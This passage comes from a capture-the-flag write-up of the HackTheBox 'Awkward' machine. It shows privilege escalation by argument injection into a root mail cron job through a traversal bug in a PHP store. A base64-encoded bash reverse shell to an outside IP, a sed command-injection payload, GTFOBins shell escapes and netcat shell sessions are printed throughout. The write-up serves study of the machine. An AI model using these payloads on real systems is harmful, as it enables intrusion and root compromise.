+<span class="mtk1">        </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"Item added successfully!"</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">        </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"Invalid item"</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+</code></pre></div><p>There are two variables that we can control: <code>user_id</code> and <code>item_id</code>, although there is a list of bad characters, the same as before. However, the bad characters list is not exhaustive. For instance, dots (<code>.</code>) and slashes (<code>/</code>) are allowed. Using this, we can perform a Directory Traversal attack. The first <code>system</code> call is not very useful, but the second one looks more critical:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">        </span><span class="mtk7">system</span><span class="mtk1">(</span><span class="mtk4">"head -2 {</span><span class="mtk1">$STORE_HOME</span><span class="mtk4">}product-details/{</span><span class="mtk1">$item_id</span><span class="mtk4">}.txt | tail -1 &gt;&gt; {</span><span class="mtk1">$STORE_HOME</span><span class="mtk4">}cart/{</span><span class="mtk1">$user_id</span><span class="mtk4">}"</span><span class="mtk1">);</span>  
+</code></pre></div><p>What the instruction does is take the second line of the item file and append it to the user cart file. Notice that we are allowed to write files into <code>/var/www/store/product-details</code>, so we can control the content of the left-hand-side file that will be appended to the right-hand-side file.</p><p>Looking for files owned by <code>www-data</code> (as user and group), we find <code>/var/www/private</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">bean@awkward</span>:<span class="code-blue">~</span>$ find / -user www-data 2&gt;/dev/null | grep -vE 'proc|sys|run'
+/var/lib/nginx/body
+/var/lib/nginx/uwsgi
+/var/lib/nginx/fastcgi
+/var/lib/nginx/scgi
+/var/lib/nginx/proxy
+<span class="code-green">bean@awkward</span>:<span class="code-blue">~</span>$ find / -group www-data 2&gt;/dev/null | grep -vE 'proc|sys|run'  
+/var/www/.pm2
+/var/www/private
+</code></pre></div><p>Actually, we can recall the CSV file at <code>/var/www/private/leave_requests.csv</code>. Maybe it is used for something. To discover this, we can run <a href="https://github.com/DominicBreuker/pspy"><code>pspy</code></a> to enumerate running processes. These look curious:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-blue">CMD: UID=0    PID=5489   | /usr/sbin/CRON -f -P</span>
+<span class="code-blue">CMD: UID=0    PID=5491   | /bin/bash /root/scripts/restore.sh</span>
+<span class="code-blue">CMD: UID=0    PID=5490   | /bin/sh -c /root/scripts/restore.sh</span>
+<span class="code-blue">CMD: UID=0    PID=5500   | /bin/bash /root/scripts/restore.sh</span>
+<span class="code-blue">CMD: UID=0    PID=5499   | mail -s Leave Request:  christine</span>
+<span class="code-blue">CMD: UID=0    PID=5503   | cp /root/backup/1.txt /var/www/store/product-details/</span>
+<span class="code-blue">CMD: UID=0    PID=5504   | /bin/bash /root/scripts/restore.sh</span>
+<span class="code-blue">CMD: UID=0    PID=5507   | /usr/sbin/sendmail -FCronDaemon -i -B8BITMIME -oem root</span>  
+<span class="code-blue">CMD: UID=0    PID=5506   | /usr/sbin/sendmail -oi -f root@awkward -t</span>
+<span class="code-blue">CMD: UID=0    PID=5508   | /usr/sbin/postdrop -r</span>
+<span class="code-blue">CMD: UID=0    PID=5509   | /usr/sbin/postdrop -r</span>
+<span class="code-blue">CMD: UID=0    PID=5510   | cleanup -z -t unix -u -c</span>
+<span class="code-blue">CMD: UID=0    PID=5511   | trivial-rewrite -n rewrite -t unix -u -c</span>
+<span class="code-blue">CMD: UID=0    PID=5512   | local -t unix</span>
+<span class="code-blue">CMD: UID=0    PID=5518   | mail -s Leave Request: bean.hill christine</span>
+</code></pre></div><p>If we search <a href="https://gtfobins.github.io/gtfobins/mail/">GTFOBins for <code>mail</code></a> or use my tool <a href="https://github.com/7Rocky/gtfobins-cli"><code>gtfobins-cli</code></a>, we can see that it is possible to inject some parameters to execute system commands:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gtfobins-cli</span> --shell mail
+
+<span class="code-bg-green code-black">mail</span> ==&gt; <span class="code-yellow">https://gtfobins.github.io/gtfobins/mail/</span>
+
+
+<span class="code-red mtku">Shell</span>
+
+It can be used to break out from restricted environments by spawning an interactive system shell.  
+
+GNU version only.
+
+<span class="code-cyan">mail --exec='!/bin/sh'</span>
+
+This creates a valid Mbox file which may be required by the binary.
+
+<span class="code-cyan">TF=$(mktemp)</span>
+<span class="code-cyan">echo "From nobody@localhost $(date)" &gt; $TF</span>
+<span class="code-cyan">mail -f $TF</span>
+<span class="code-cyan">!/bin/sh</span>
+</code></pre></div><p>Let&rsquo;s try to guess what is the CSV file for. For instance, we can try to add some data like this:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">bean@awkward</span>:<span class="code-blue">~</span>$ cat &gt; /var/www/store/product-details/4.txt  
+***Hat Valley Product***
+asdf
+^C
+<span class="code-green">bean@awkward</span>:<span class="code-blue">~</span>$
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> store.hat-valley.htb/cart_actions.php -d <span class="code-dark-yellow">'item=4&user=../../../../../var/www/private/leave_requests.csv&action=add_item'</span> -H <span class="code-dark-yellow">'Authorization: Basic YWRtaW46MDE0bXJiZWFucnVsZXMhI1A='</span>  
+Item added successfully!
+</code></pre></div><p>To see if something was appended or not, we can use the previous LFR vulnerability:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">node</span> <span class="mtku">readFile.js</span> /var/www/private/leave_requests.csv
+Leave Request Database,,,,
+,,,,
+HR System Username,Reason,Start Date,End Date,Approved
+bean.hill,Taking a holiday in Japan,23/07/2022,29/07/2022,Yes
+christine.wool,Need a break from Jackson,14/03/2022,21/03/2022,Yes
+jackson.lightheart,Great uncle's goldfish funeral + ceremony,10/05/2022,10/06/2022,No  
+jackson.lightheart,Vegemite eating competition,12/12/2022,22/12/2022,No
+christopher.jones,Donating blood,19/06/2022,23/06/2022,Yes
+christopher.jones,Taking a holiday in Japan with Bean,29/07/2022,6/08/2022,Yes
+bean.hill,Inevitable break from Chris after Japan,14/08/2022,29/08/2022,No
+asdf
+</code></pre></div><p>There it is. And if we look at the running processes, we have this one:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-blue">CMD: UID=0    PID=5518   | mail -s Leave Request: asdf christine</span>  
+</code></pre></div><p>Another way of testing this functionality is using <code>/api/submit-leave</code> contrilling the <code>user</code> variable with a forged JWT token (as before). However, this way is not useful for exploitation due to the bad chars list.</p><h2 id="privilege-escalation">Privilege escalation</h2><p>Since the content appended to the CSV file is reflected in the <code>mail</code> command, we can try to inject the malicious parameter. For instance, let&rsquo;s write a reverse shell command in a Bash script:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">bean@awkward</span>:<span class="code-blue">~</span>$ cat &gt; /tmp/shell.sh
+#!/bin/bash
+echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash  
+^C
+<span class="code-green">bean@awkward</span>:<span class="code-blue">~</span>$ chmod +x /tmp/shell.sh
+</code></pre></div><p>Then we can enter <code>--exec='!/tmp/shell.sh'</code> in the CSV file:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">bean@awkward</span>:<span class="code-blue">~</span>$ cat &gt; /var/www/store/product-details/4.txt  
+***Hat Valley Product***
+--exec='!/tmp/shell.sh'
+^C
+<span class="code-green">bean@awkward</span>:<span class="code-blue">~</span>$
+</code></pre></div><p>Now, we write malicious parameter into the CSV file:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> store.hat-valley.htb/cart_actions.php -d <span class="code-dark-yellow">'item=1337&user=../../../../../var/www/private/leave_requests.csv&action=add_item'</span> -H <span class="code-dark-yellow">'Authorization: Basic YWRtaW46MDE0bXJiZWFucnVsZXMhI1A='</span>  
+Item added successfully!
+</code></pre></div><p>And there it is:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">node</span> <span class="mtku">readFile.js</span> /var/www/private/leave_requests.csv
+Leave Request Database,,,,
+,,,,
+HR System Username,Reason,Start Date,End Date,Approved
+bean.hill,Taking a holiday in Japan,23/07/2022,29/07/2022,Yes
+christine.wool,Need a break from Jackson,14/03/2022,21/03/2022,Yes
+jackson.lightheart,Great uncle's goldfish funeral + ceremony,10/05/2022,10/06/2022,No  
+jackson.lightheart,Vegemite eating competition,12/12/2022,22/12/2022,No
+christopher.jones,Donating blood,19/06/2022,23/06/2022,Yes
+christopher.jones,Taking a holiday in Japan with Bean,29/07/2022,6/08/2022,Yes
+bean.hill,Inevitable break from Chris after Japan,14/08/2022,29/08/2022,No
+--exec='!/tmp/shell.sh'
+</code></pre></div><p>However, it is not working, although we see this command:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-blue">CMD: UID=0    PID=4047   | mail -s Leave Request: --exec='!/tmp/shell.sh' christine</span>  
+</code></pre></div><p>We can try to add spaces in the left and in the right and nothing happens. Hence, we can guess that the payload is wrapped somehow into double quotes, so let&rsquo;s try to escape from those:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">bean@awkward</span>:<span class="code-blue">~</span>$ cat &gt; /var/www/store/product-details/4.txt  
+***Hat Valley Product***
+" --exec='!/tmp/shell.sh' "
+^C
+<span class="code-green">bean@awkward</span>:<span class="code-blue">~</span>$
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> store.hat-valley.htb/cart_actions.php -d <span class="code-dark-yellow">'item=1337&user=../../../../../var/www/private/leave_requests.csv&action=add_item'</span> -H <span class="code-dark-yellow">'Authorization: Basic YWRtaW46MDE0bXJiZWFucnVsZXMhI1A='</span>  
+Item added successfully!
+
+<span class="code-cyan">$</span> <span class="code-dark-green">node</span> <span class="mtku">readFile.js</span> /var/www/private/leave_requests.csv
+Leave Request Database,,,,
+,,,,
+HR System Username,Reason,Start Date,End Date,Approved
+bean.hill,Taking a holiday in Japan,23/07/2022,29/07/2022,Yes
+christine.wool,Need a break from Jackson,14/03/2022,21/03/2022,Yes
+jackson.lightheart,Great uncle's goldfish funeral + ceremony,10/05/2022,10/06/2022,No
+jackson.lightheart,Vegemite eating competition,12/12/2022,22/12/2022,No
+christopher.jones,Donating blood,19/06/2022,23/06/2022,Yes
+christopher.jones,Taking a holiday in Japan with Bean,29/07/2022,6/08/2022,Yes
+bean.hill,Inevitable break from Chris after Japan,14/08/2022,29/08/2022,No
+" --exec='!/tmp/shell.sh' "
+</code></pre></div><p>And now it works! We have a reverse shell as <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.11.185.
+Ncat: Connection from 10.10.11.185:59596.
+bash: cannot set terminal process group (977): Inappropriate ioctl for device  
+bash: no job control in this shell
+root@awkward:~/scripts# script /dev/null -c bash
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+root@awkward:~/scripts# ^Z
+zsh: suspended  ncat -nlvp 4444
+
+<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
+[1]  + continued  ncat -nlvp 4444
+                                 reset xterm
+root@awkward:~/scripts# export TERM=xterm
+root@awkward:~/scripts# export SHELL=bash
+root@awkward:~/scripts# stty rows 50 columns 158
+</code></pre></div><p>Let&rsquo;s take the <code>root.txt</code> flag:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">root@awkward:~/scripts# cat /root/root.txt  
+5b7759c68ce8411582696a65bf945c05
+</code></pre></div><p>As expected, the <code>mail</code> command contained double quotes:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">root@awkward:~/scripts# cat notify.sh  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/bin/bash</span>
+
+<span class="mtk1">inotifywait --quiet --monitor --event modify /var/</span><span class="mtk1">www/private/leave_requests.csv </span><span class="mtk5">|</span><span class="mtk1"> </span><span class="mtk5">while</span><span class="mtk1"> </span><span class="mtk7">read</span><span class="mtk5">;</span><span class="mtk1"> </span><span class="mtk5">do</span>
+<span class="mtk1">        change=</span><span class="mtk4">$(tail -1 /var/www/private/leave_requests.csv)</span>
+<span class="mtk1">        name=</span><span class="mtk4">`echo </span><span class="mtk1">$change</span><span class="mtk4"> </span><span class="mtk5">|</span><span class="mtk4"> awk -F, '{print $1}'`</span>
+<span class="mtk1">        </span><span class="mtk7">echo</span><span class="mtk1"> -e </span><span class="mtk4">"You have a new leave request to review!\n</span><span class="mtk1">$change</span><span class="mtk4">"</span><span class="mtk1"> </span><span class="mtk5">|</span><span class="mtk1"> mail -s </span><span class="mtk4">"Leave Request: "</span><span class="mtk1">$name christine</span>  
+<span class="mtk5">done</span>
+</code></pre></div><h2 id="alternative-path">Alternative path</h2><p>There is a way to get a reverse shell as <code>www-data</code>, so it is easier to append content to the CSV file. The exploit is in the store application, in the <code>delete_item</code> method, particularly here:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk8">checkValidItem</span><span class="mtk1">(</span><span class="mtk4">"{</span><span class="mtk1">$STORE_HOME</span><span class="mtk4">}cart/{</span><span class="mtk1">$user_id</span><span class="mtk4">}"</span><span class="mtk1">)) {</span>
+<span class="mtk1">        </span><span class="mtk7">system</span><span class="mtk1">(</span><span class="mtk4">"sed -i '/item_id={</span><span class="mtk1">$item_id</span><span class="mtk4">}/d' {</span><span class="mtk1">$STORE_HOME</span><span class="mtk4">}cart/{</span><span class="mtk1">$user_id</span><span class="mtk4">}"</span><span class="mtk1">);</span>  
+<span class="mtk1">        </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"Item removed from cart"</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+</code></pre></div><p>Again, there is a <a href="https://gtfobins.github.io/gtfobins/sed/">GTFOBin for <code>sed</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gtfobins-cli</span> --shell sed
+
+<span class="code-bg-green code-black">sed</span> ==&gt; <span class="code-yellow">https://gtfobins.github.io/gtfobins/sed/</span>
+
+
+<span class="code-red mtku">Shell</span>
+
+It can be used to break out from restricted environments by spawning an interactive system shell.  
+
+GNU version only. Also, this requires <span class="code-cyan">bash</span>.
+
+<span class="code-cyan">sed -n '1e exec sh 1&gt;&0' /etc/hosts</span>
+
+GNU version only. The resulting shell is not a proper TTY shell.
+
+<span class="code-cyan">sed e</span>
+</code></pre></div><p>And we control both <code>item_id</code> and <code>user_id</code>. If we add an item from the website, we will see this file (with the user identifier found in <code>localStorage</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">bean@awkward</span>:<span class="code-blue">~</span>$ ls /var/www/store/cart  
+d04c-f798-688-7e56
+</code></pre></div><p>So, we should leave that file as is because <code>checkValidItem</code> needs to validate it. However, let&rsquo;s enter the following payload in <code>item_id</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">1' -e '1e /tmp/shell.sh' /'  
+</code></pre></div><p>Notice that <code>-e</code> (<code>--expression=script</code>) is required:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">bean@awkward</span>:<span class="code-blue">~</span>$ sed 2&gt;&1 | grep '\-e'
+  <span class="code-red">-e</span> script, -<span class="code-red">-e</span>xpression=script
+  -E, -r, --regexp<span class="code-red">-e</span>xtended
+If no <span class="code-red">-e</span>, -<span class="code-red">-e</span>xpression, -f, or --file option is given, then the first
+<span class="code-green">bean@awkward</span>:<span class="code-blue">~</span>$ sed 2&gt;&1 | grep '\-n'
+Usage: sed [OPTION]... {script-only-if<span class="code-red">-n</span>o-other-script} [input-file]...  
+  <span class="code-red">-n</span>, --quiet, --silent
+  -z, -<span class="code-red">-n</span>ull-data
+</code></pre></div><p>We can send the payload using <code>curl</code> and get the reverse shell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> store.hat-valley.htb/cart_actions.php -d <span class="code-dark-yellow">"item=1' -e '1e /tmp/shell.sh' '&user=d04c-f798-688-7e56&action=delete_item"</span> -H <span class="code-dark-yellow">'Authorization: Basic YWRtaW46MDE0bXJiZWFucnVsZXMhI1A='  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.11.185.
+Ncat: Connection from 10.10.11.185:49182.
+bash: cannot set terminal process group (1325): Inappropriate ioctl for device  
+bash: no job control in this shell
+www-data@awkward:~/store$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+www-data@awkward:~/store$ ^Z
+zsh: suspended  ncat -nlvp 4444
+
+<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
+[1]  + continued  ncat -nlvp 4444
+                                 reset xterm
+www-data@awkward:~/store$ export TERM=xterm
+www-data@awkward:~/store$ export SHELL=bash
+www-data@awkward:~/store$ stty rows 50 columns 158
+</code></pre></div><p>So now we can interact with the CSV file directly:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@awkward:~/store$ cat /var/www/private/leave_requests.csv
+Leave Request Database,,,,
+,,,,
+HR System Username,Reason,Start Date,End Date,Approved
+bean.hill,Taking a holiday in Japan,23/07/2022,29/07/2022,Yes
+christine.wool,Need a break from Jackson,14/03/2022,21/03/2022,Yes
+jackson.lightheart,Great uncle's goldfish funeral + ceremony,10/05/2022,10/06/2022,No  
+jackson.lightheart,Vegemite eating competition,12/12/2022,22/12/2022,No
+christopher.jones,Donating blood,19/06/2022,23/06/2022,Yes
+christopher.jones,Taking a holiday in Japan with Bean,29/07/2022,6/08/2022,Yes
+bean.hill,Inevitable break from Chris after Japan,14/08/2022,29/08/2022,No
+</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeration">Enumeration</a><ul><li><a href="#authentication-bypass">Authentication bypass</a></li><li><a href="#exploiting-ssrf">Exploiting SSRF</a></li><li><a href="#static-code-analysis">Static code analysis</a></li></ul></li><li><a href="#foothold">Foothold</a><ul><li><a href="#finding-a-lfr-vulnerability">Finding a LFR vulnerability</a></li><li><a href="#finding-a-plaintext-password">Finding a plaintext password</a></li></ul></li><li><a href="#system-enumeration">System enumeration</a><ul><li><a href="#enumerating-the-store-application">Enumerating the store application</a></li></ul></li><li><a href="#privilege-escalation">Privilege escalation</a></li><li><a href="#alternative-path">Alternative path</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Receive a weekly blog digest</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Enter your email address" name="email" id="tlemail">
+<input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Submit"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc">powered by <a href="https://tinyletter.com" target="_blank" title="TinyLetter">TinyLetter</a></p><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
